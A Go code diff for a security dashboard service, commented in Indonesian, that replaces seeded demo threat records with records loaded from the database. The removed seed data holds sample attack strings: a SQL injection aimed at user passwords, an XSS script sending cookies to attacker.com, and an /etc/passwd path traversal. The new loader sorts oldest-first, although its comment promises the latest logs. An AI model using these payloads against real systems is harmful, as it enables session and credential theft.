@@ -68,7 +68,7 @@ func GetSecurityService() *SecurityService {
 		}
 
 		svc.loadBlockedIPsFromDB()
-		svc.seedInitialThreats()
+		svc.loadThreatLogsFromDB()
 		GlobalSecurityService = svc
 	})
 	return GlobalSecurityService
@@ -634,56 +634,40 @@ func (s *SecurityService) GetThreatSummary() models.ThreatSummaryDTO {
 	}
 }
 
-// seedInitialThreats menginisialisasi sampel ancaman realistik untuk monitoring dashboard
-func (s *SecurityService) seedInitialThreats() {
-	sampleThreats := []struct {
-		ip         string
-		threatType string
-		severity   string
-		payload    string
-		endpoint   string
-		method     string
-	}{
-		{"185.220.101.5", "sql_injection", "critical", "' UNION SELECT null, username, password FROM users--", "/api/products", "GET"},
-		{"45.33.32.156", "sensitive_probe", "high", "GET /.env HTTP/1.1", "/.env", "GET"},
-		{"194.26.29.112", "xss_payload", "high", "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>", "/api/bio/lead", "POST"},
-		{"103.145.2.88", "path_traversal", "critical", "../../../etc/passwd", "/uploads/avatar", "GET"},
-		{"198.51.100.24", "brute_force", "critical", "Brute force login target 'admin' (8 fails in 3m)", "/api/auth/login", "POST"},
-		{"203.0.113.89", "flooding", "high", "Rate limit exceeded: 145 reqs/min", "/api/dashboard/stats", "GET"},
+// loadThreatLogsFromDB memuat histori ancaman murni dari database tanpa data tiruan/demo
+func (s *SecurityService) loadThreatLogsFromDB() {
+	if config.DB == nil {
+		return
 	}
 
-	for _, sample := range sampleThreats {
-		loc := s.geoService.ResolveIP(sample.ip)
-		tLog := models.SecurityThreatLog{
-			IPAddress:    sample.ip,
-			ThreatType:   sample.threatType,
-			Severity:     sample.severity,
-			Payload:      sample.payload,
-			Endpoint:     sample.endpoint,
-			Method:       sample.method,
-			UserAgent:    "Mozilla/5.0 (Security Scanner Test)",
-			Country:      loc.Country,
-			Province:     loc.Province,
-			City:         loc.City,
-			ISP:          loc.ISP,
-			Latitude:     loc.Latitude,
-			Longitude:    loc.Longitude,
-			Blocked:      true,
-			ActionTaken:  "blocked",
-			RequestCount: 1,
-			CreatedAt:    time.Now().Add(-10 * time.Minute),
-		}
+	// 1. Ambil jumlah total ancaman nyata
+	var count int64
+	if err := config.DB.Model(&models.SecurityThreatLog{}).Count(&count).Error; err == nil {
+		s.totalThreats = count
+	}
 
-		s.totalThreats++
-		s.byTypeCount[tLog.ThreatType]++
-		s.threatLogsBuffer = append(s.threatLogsBuffer, tLog)
-		s.blockedIPs[sample.ip] = models.BlockedIP{
-			IPAddress:  sample.ip,
-			Reason:     fmt.Sprintf("Auto-block: Terdeteksi %s", sample.threatType),
-			ThreatType: sample.threatType,
-			BlockedBy:  "system",
-			IsActive:   true,
-			CreatedAt:  time.Now(),
+	// 2. Ambil agregasi per tipe ancaman
+	type ThreatTypeStat struct {
+		ThreatType string
+		Count      int64
+	}
+	var typeStats []ThreatTypeStat
+	if err := config.DB.Model(&models.SecurityThreatLog{}).
+		Select("threat_type, count(*) as count").
+		Group("threat_type").
+		Scan(&typeStats).Error; err == nil {
+		s.mu.Lock()
+		for _, stat := range typeStats {
+			s.byTypeCount[stat.ThreatType] = stat.Count
 		}
+		s.mu.Unlock()
+	}
+
+	// 3. Ambil log ancaman terbaru murni dari database
+	var dbLogs []models.SecurityThreatLog
+	if err := config.DB.Order("created_at asc").Limit(s.maxBuffer).Find(&dbLogs).Error; err == nil {
+		s.mu.Lock()
+		s.threatLogsBuffer = dbLogs
+		s.mu.Unlock()
 	}
 }
